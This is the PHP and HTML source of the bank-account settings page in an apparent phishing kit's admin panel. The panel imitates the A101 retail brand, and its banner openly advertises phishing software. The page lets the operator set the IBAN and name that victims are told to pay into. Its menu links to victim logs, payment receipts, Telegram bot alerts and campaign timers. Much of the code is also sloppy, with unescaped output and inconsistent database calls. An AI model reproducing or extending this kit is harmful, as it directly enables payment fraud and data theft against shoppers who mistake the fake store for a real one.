<?php
// Start the session
session_start();
ob_start();

// If the user is not logged in
if (!isset($_SESSION['user'])) {
    header('Location: index.php');
    exit;
}

// Include the database connection
include_once('../inc/db.php');
$db = db_connect();

// İkinci sütundaki verileri çekme
$sql_sutun2 = "SELECT * FROM bella_a101_admins";
$result_sutun2 = $db->query($sql_sutun2);

if ($result_sutun2->num_rows > 0) {
    while ($row = $result_sutun2->fetch_assoc()) {
        $veri_sutun2 = $row['s2_column'];
        // İşlem yapabilirsiniz (örneğin, ekrana yazdırabilirsiniz)
    }
}

// İlk sütundaki verileri çekme
$sql_sutun1 = "SELECT * FROM bella_a101_banks";
$result_sutun1 = $db->query($sql_sutun1);

if ($result_sutun1->num_rows > 0) {
    while ($row = $result_sutun1->fetch_assoc()) {
        $veri_sutun1 = $row['s1_column'];
        // İşlem yapabilirsiniz (örneğin, ekrana yazdırabilirsiniz)
    }
}
// Get All Makbuz
$makbuz = $db->query('SELECT * FROM bella_a101_makbuz')->fetchAll(PDO::FETCH_OBJ);

// Get All Logs
$logs = $db->query('SELECT * FROM bella_a101_logs')->fetchAll(PDO::FETCH_OBJ);
// Get All Products
$products = $db->query('SELECT * FROM bella_a101_products')->fetchAll(PDO::FETCH_OBJ);

// Bu kısımda başka işlemler veya kod devam etmelidir.

// Veritabanı bağlantısını kapatma
$db = null;
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Raizy - A-101 Gösterge Paneli</title>
    <!-- plugins:css -->
    <link rel="stylesheet" href="assets/vendors/mdi/css/materialdesignicons.min.css">
    <link rel="stylesheet" href="assets/vendors/css/vendor.bundle.base.css">
    <!-- endinject -->
    <!-- Plugin css for this page -->
    <link rel="stylesheet" href="assets/vendors/jvectormap/jquery-jvectormap.css">
    <link rel="stylesheet" href="assets/vendors/flag-icon-css/css/flag-icon.min.css">
    <link rel="stylesheet" href="assets/vendors/owl-carousel-2/owl.carousel.min.css">
    <link rel="stylesheet" href="assets/vendors/owl-carousel-2/owl.theme.default.min.css">
    <!-- End plugin css for this page -->
    <!-- inject:css -->
    <!-- endinject -->
    <!-- Layout styles -->
    <link rel="stylesheet" href="assets/css/style.css">
    <!-- End layout styles -->
    <link rel="shortcut icon" href="assets/images/favicon.png" />
  </head>
  <body>
    <div class="container-scroller">
      <!-- partial:partials/_sidebar.html -->
      <nav class="sidebar sidebar-offcanvas" id="sidebar">
        <div class="sidebar-brand-wrapper d-none d-lg-flex align-items-center justify-content-center fixed-top">
          <a class="sidebar-brand brand-logo" href="dashboard.php"><img src="https://i.ibb.co/12v9gYZ/raizy.png" alt="logo" /></a>
          <a class="sidebar-brand brand-logo-mini" href="dashboard.php"><img src="https://pnglib.nyc3.cdn.digitaloceanspaces.com/uploads/2021/02/letter-r-png-stock-photo_60233c95ea018.png" alt="logo" /></a>
        </div>
        <ul class="nav">
          <li class="nav-item profile">
            <div class="profile-desc">
              <div class="profile-pic">
                <div class="count-indicator">
                  <img class="img-xs rounded-circle " src="https://i.pinimg.com/originals/68/b8/cf/68b8cffa132ef42175dfa0f271859cef.gif" alt="">
                  <span class="count bg-success"></span>
                </div>
                <div class="profile-name">
                  <h5 class="mb-0 font-weight-normal">Raizy</h5>
                  <span>Yönetici</span>
                </div>
              </div>
              
                  </div>
                
              
            
          </li>
          
          <li class="nav-item menu-items">
            <a class="nav-link" href="dashboard.php">
              <span class="menu-icon">
                <i class="mdi mdi-speedometer"></i>
              </span>
              <span class="menu-title">Anasayfa</span>
            </a>
          </li>
          <li class="nav-item menu-items active">
            <a class="nav-link" data-toggle="collapse" href="#ui-basic" aria-expanded="false" aria-controls="ui-basic">
              <span class="menu-icon">
                <i class="mdi mdi-settings"></i>
              </span>
              <span class="menu-title">Ayarlar</span>
              <i class="menu-arrow"></i>
            </a>
            <div class="collapse show" id="ui-basic">
              <ul class="nav flex-column sub-menu">
                <li class="nav-item"> <a class="nav-link" href="password-edit.php">Parola Güncelleme</a></li>
                <li class="nav-item"> <a class="nav-link active" href="bank_add.php">Havale / Eft Güncelleme</a></li>
                  <li class="nav-item"> <a class="nav-link" href="telegram-add.php">Telegram Bot Güncelleme</a></li>
              <li class="nav-item"> <a class="nav-link" href="kampanya_sure.php">Aktif Süre Güncelleme</a></li>
               
              </ul>
            </div>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="loglar.php">
              <span class="menu-icon">
                <i class="mdi mdi-playlist-play"></i>
              </span>
              <span class="menu-title">Loglar</span><label class="badge badge-danger"><?= count($logs) ?></label>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="makbuz.php">
              <span class="menu-icon">
                <i class="mdi mdi-table-large"></i>
              </span>
              <span class="menu-title">Makbuz Listesi</span><label class="badge badge-warning"><?= count($makbuz) ?></label>
            </a>
          </li>
           <li class="nav-item menu-items">
            <a class="nav-link" href="urunler.php">
              <span class="menu-icon">
                <i class="mdi mdi-chart-bar"></i>
              </span>
              <span class="menu-title">Ürünler</span><label class="badge badge-success"><?= count($products) ?></label>
            </a>
          </li>
          <li class="nav-item menu-items">
            <a class="nav-link" href="yeni_urun.php">
              <span class="menu-icon">
                <i class="mdi mdi-contacts"></i>
              </span>
              <span class="menu-title">Yeni Ürün Ekle</span>
            </a>
          </li>
           <li class="nav-item menu-items">
            <a class="nav-link" href="logout.php">
              <span class="menu-icon">
                <i class="mdi mdi-logout text-danger"></i>
              </span>
              <span class="menu-title">Çıkış Yap</span>
            </a>
          </li>
        </ul>
      </nav>
      <!-- partial -->
      <div class="container-fluid page-body-wrapper">
        <!-- partial:partials/_navbar.html -->
        <nav class="navbar p-0 fixed-top d-flex flex-row">
          <div class="navbar-brand-wrapper d-flex d-lg-none align-items-center justify-content-center">
            <a class="navbar-brand brand-logo-mini" href="dashboard.php"><img src="assets/images/logo-mini.svg" alt="logo" /></a>
          </div>
          <div class="navbar-menu-wrapper flex-grow d-flex align-items-stretch">
            <button class="navbar-toggler navbar-toggler align-self-center" type="button" data-toggle="minimize">
              <span class="mdi mdi-menu"></span>
            </button>
            <ul class="navbar-nav w-100">
              <li class="nav-item w-100">
               
              </li>
            </ul>
            <ul class="navbar-nav navbar-nav-right">
             
             
              
                
             
             
           
              <li class="nav-item dropdown">
                <a class="nav-link" id="profileDropdown" href="#" data-toggle="dropdown">
                  <div class="navbar-profile">
                    <img class="img-xs rounded-circle" src="https://i.pinimg.com/originals/68/b8/cf/68b8cffa132ef42175dfa0f271859cef.gif" alt="">
                    <p class="mb-0 d-none d-sm-block navbar-profile-name">Raizy</p>
                  
                  </div>
                </a>
                
              </li>
            </ul>
            <button class="navbar-toggler navbar-toggler-right d-lg-none align-self-center" type="button" data-toggle="offcanvas">
              <span class="mdi mdi-format-line-spacing"></span>
            </button>
          </div>
        </nav>
        <!-- partial -->
        <div class="main-panel">
          <div class="content-wrapper">
            <div class="row">
              <div class="col-12 grid-margin stretch-card">
                <div class="card corona-gradient-card">
                  <div class="card-body py-0 px-0 px-sm-3">
                    <div class="row align-items-center">
                      <div class="col-4 col-sm-3 col-xl-2">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/df/A101_logo.svg/1280px-A101_logo.svg.png" class="gradient-corona-img img-fluid" alt="">
                      </div>
                      <div class="col-5 col-sm-7 col-xl-8 p-0">
                        <h4 class="mb-1 mb-sm-0">Panele mi ihtiyacınız var?</h4>
                        <p class="mb-0 font-weight-normal d-none d-sm-block">Hayalinizdeki phising tarzı yazılımlara ulaşabilirsiniz.</p>
                      </div>
                      <div class="col-3 col-sm-2 col-xl-2 pl-0 text-center">
                        <span>
                          <a href="https://instagram.com/raizymedia" target="_blank" class="btn btn-outline-light btn-rounded get-started-btn">Bize Ulaşın!</a>
                        </span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            
            <div class="row">
             <div class="col-lg-12 grid-margin stretch-card">
                <div class="card">
                  <div class="card-body">
                    <form method="POST" id="bankaForm" enctype="multipart/form-data">
                <div class="card-body">
                    <h4 class="card-title">Havale / EFT Güncelleme</h4>
                    <p class="card-description"> IBAN bilgilerini doğru bir şekilde güncelleyerek devam edin.</p>
                    <form class="forms-sample">
                      <div class="form-group">
                        <label for="exampleInputName1">Banka Adı</label>
                        <input type="text" class="form-control" placeholder="Banka Adını Girin" id="bankName" name="bank_name" required>
                      </div>
                      <div class="form-group">
                        <label for="exampleInputEmail3">IBAN Numarası</label>
                        <input type="text" class="form-control" placeholder="IBAN Girin" id="iban" name="iban" required>
                      </div>
                      <div class="form-group">
                        <label for="exampleInputPassword4">Ad Soyad</label>
                        <input type="text" class="form-control" placeholder="Ad ve Soyad Girin" id="fullName" name="name_surname" required>
                      </div>
                      
                      <div class="form-group">
                        <label>Banka Logo (.png)</label>
                        <input type="file" id="bankLogo" name="bank_logo" accept=".png" class="file-upload-default" required>
                        <div class="input-group col-xs-12">
                          <input type="text" class="form-control file-upload-info" disabled=""   placeholder="Banka Logosu">
                          <span class="input-group-append">
                            <button class="file-upload-browse btn btn-primary" type="button"  >Logo Yükle</button>
                          </span>
                        </div>
                      </div>
                    
                      <button id="submitBtn" type="button" class="btn btn-primary mr-2" onclick="submitForm()">Banka Ekle</button>
                  
                    </form>
                   </div>
                   
                   <div class="card">
                  <div class="card-body">
                    <h4 class="card-title">Güncel Eklenen Banka Bilgileri</h4>
                   
                    </p>
                    <?php foreach ($result_sutun1 as $row): ?>
                    <div class="table-responsive">
                      <table class="table">
                        <thead>
                          <tr>
                            <th>Banka Logo</th>
                            <th>Banka Adı</th>
                            <th>Ad Soyad</th>
                            <th>IBAN</th>
                          </tr>
                        </thead>
                        <tbody>
                         <tr>
                            <td><img src="uploads/<?php echo $row['bank_logo']; ?>" width="150" alt="Description of the image"></td>
                            <td><?php echo $row['bank_name']; ?></td>
                            <td><?php echo $row['name_surname']; ?></td>
                            <td><label class="badge badge-info"><?php echo $row['iban']; ?></label></td>
                          </tr>
                          <?php endforeach ?>
                        </tbody>
                      </table>
                    </div>
                  </div>
                </div>
                      </div>
                      
                    </div>
                  </div>
                </div>
              </div>
          
          <!-- content-wrapper ends -->
          <!-- partial:../../partials/_footer.html -->
          <footer class="footer">
            <div class="d-sm-flex justify-content-center justify-content-sm-between">
              <span class="text-muted d-block text-center text-sm-left d-sm-inline-block">Copyright © Raizy Media - 2023</span>
              
            </div>
          </footer>
          <!-- partial -->
        </div>
        <!-- main-panel ends -->
      </div>
      <!-- page-body-wrapper ends -->
    </div>
    <!-- container-scroller -->
      <style>
        .sidebar .nav .nav-item .nav-link .badge {
    margin-right: auto;
    margin-left: 0.5rem;
    margin-block: 0;
}
        
    </style>
    <style>
 .swal2-modal .swal2-title {
    font-size: 25px;
    line-height: 1;
    font-weight: 500;
    color: #ff0000;
    font-weight: initial;
    margin-bottom: 0;
    font-weight: bold;
}
[class^=swal2] {
    -webkit-tap-highlight-color: transparent;
    font-weight: bold;
    color: black;
}

</style>
    <!-- plugins:js -->
   <script>
    function submitForm() {
        // Form alanlarını al
        var bankName = document.getElementById("bankName").value;
        var iban = document.getElementById("iban").value;
        var fullName = document.getElementById("fullName").value;

        // Boş alanları kontrol et
        if (bankName === "" || iban === "" || fullName === "") {
            // Boş alanlar varsa SweetAlert2 ile uyarı mesajı göster
            Swal.fire({
                icon: 'error',
                title: 'Hata!',
                text: 'Lütfen tüm alanları doldurun.',
                confirmButtonText: 'Tamam'
            });
        } else {
            // Boş alan yoksa formu gönder
            var formData = new FormData(document.getElementById("bankaForm"));
            fetch('banka_ekle.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // Başarı durumunda SweetAlert2 ile mesajı göster
                    Swal.fire({
                        icon: 'success',
                        title: 'Başarılı!',
                        text: data.message,
                        confirmButtonText: 'Tamam'
                    });
                } else {
                    // Hata durumunda SweetAlert2 ile hata mesajını göster
                    Swal.fire({
                        icon: 'error',
                        title: 'Hata!',
                        text: data.message,
                        confirmButtonText: 'Tamam'
                    });
                }
            })
            .catch(error => {
                console.error('Hata:', error);
            });
        }
    }
</script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@10/dist/sweetalert2.all.min.js"></script>
   <script src="assets/vendors/js/vendor.bundle.base.js"></script>
    <!-- endinject -->
    <!-- Plugin js for this page -->
    <script src="assets/vendors/select2/select2.min.js"></script>
    <script src="assets/vendors/typeahead.js/typeahead.bundle.min.js"></script>
    <!-- End plugin js for this page -->
    <!-- inject:js -->
    <script src="assets/js/off-canvas.js"></script>
    <script src="assets/js/hoverable-collapse.js"></script>
    <script src="assets/js/misc.js"></script>
    <script src="assets/js/settings.js"></script>
    <script src="assets/js/todolist.js"></script>
    <!-- endinject -->
    <!-- Custom js for this page -->
    <script src="assets/js/file-upload.js"></script>
    <script src="assets/js/typeahead.js"></script>
    <script src="assets/js/select2.js"></script>
    <!-- End custom js for this page -->
  </body>
</html>